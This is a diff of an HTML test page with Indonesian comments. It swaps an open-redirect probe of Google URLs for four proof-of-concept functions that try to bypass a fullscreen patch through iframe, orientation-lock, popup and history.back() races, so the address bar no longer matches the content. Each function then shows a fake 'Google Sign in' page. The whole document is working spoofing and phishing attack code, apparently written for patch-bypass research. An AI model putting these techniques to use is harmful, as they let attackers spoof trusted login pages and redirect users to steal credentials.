@@ -1,34 +1,62 @@
 <!DOCTYPE html>
 <html>
+<head><meta name="viewport" content="width=device-width, initial-scale=1"></head>
 <body>
-<script>
-// Daftar endpoint redirect historis di properti Google yang kadang bisa
-// masih open saat ini — tes satu-satu apakah benar-benar redirect eksternal
-const endpoints = [
-  'https://www.google.com/url?q=https://example.com',
-  'https://www.google.com/url?sa=t&url=https://example.com',
-  'https://www.google.com/url?ust=https://example.com&q=',
-  'https://news.google.com/rss/articles/...',        // pola CVE 2024-51479 dulu masih open
-  'https://accounts.google.com/Logout?continue=https://example.com',
-  'https://accounts.google.com/o/oauth2/auth?redirect_uri=https://example.com&client_id=...',
-  'https://support.google.com/accounts?key=%3Ahttps://example.com',
-  'https://chrome.google.com/webstore/detail/.../...'
-];
+<button onclick="A()">Test A: fullscreen via iframe content</button><br>
+<button onclick="B()">Test B: fullscreen + orientation race</button><br>
+<button onclick="C()">Test C: popup fullscreen (satu gesture)</button><br>
+<button onclick="D()">Test D: fullscreen + history.back() race</button>
 
-// Uji redirect pakai fetch no-cors + response.url
-async function probe(u) {
-  try {
-    const r = await fetch(u, {redirect:'follow', mode:'no-cors'});
-    // no-cors menyembunyikan body tapi response.type === 'opaque' tidak bisa dibaca
-    // gunakan window.open + iframe onload sebagai fallback
-  } catch(e){}
+<script>
+// A: iframe dengan allow fullscreen, request dari gesture di parent
+//    (cek apakah patch hanya enforce di top-level document)
+function A() {
+  const f = document.createElement('iframe');
+  f.allow = 'fullscreen';
+  f.src = 'about:blank';
+  document.body.appendChild(f);
+  f.onload = () => {
+    f.contentDocument.documentElement.requestFullscreen()
+      .then(() => f.contentDocument.body.innerHTML = '<h1>Google Sign in (fake)</h1>')
+      .catch(e => console.log('A blocked:', e.name, e.message));
+  };
 }
 
-// Alternatif: buka di popup dan biarkan user menutup — redirect eksternal terlihat
-endpoints.forEach(u => {
-  const w = window.open(u + '&_t=' + Date.now());
-  // Jika popup berakhir di example.com (bukan google.com), endpoint masih open
-});
+// B: fullscreen dari top-level gesture, lalu lock orientation + ganti konten
+//    saat transisi — targetnya omnibox tidak re-layout
+function B() {
+  document.documentElement.requestFullscreen()
+    .then(() => screen.orientation.lock('landscape'))
+    .then(() => {
+      document.body.innerHTML = '<h1>Google Sign in (fake)</h1>';
+    })
+    .catch(e => console.log('B blocked:', e.name, e.message));
+}
+
+// C: window.open DARI gesture yang sama, inject konten + fullscreen di popup
+//    (popup baru di-allow karena dibuka dari gesture)
+function C() {
+  const w = window.open('about:blank');
+  if (!w) return console.log('C: popup blocked');
+  w.document.body.innerHTML = '<h1>Google Sign in (fake)</h1>';
+  w.document.documentElement.requestFullscreen()
+    .then(() => console.log('C: fullscreen ok di popup'))
+    .catch(e => console.log('C blocked:', e.name, e.message));
+}
+
+// D: fullscreen, lalu history.back() saat transisi — omnibox kadang
+//    tidak kembali sinkron dengan konten yang tampil
+function D() {
+  history.pushState({p:1}, '', '?step=2');
+  document.documentElement.requestFullscreen()
+    .then(() => {
+      history.back();
+      setTimeout(() => {
+        document.body.innerHTML = '<h1>Google Sign in (fake)</h1>';
+      }, 50);
+    })
+    .catch(e => console.log('D blocked:', e.name, e.message));
+}
 </script>
 </body>
 </html>
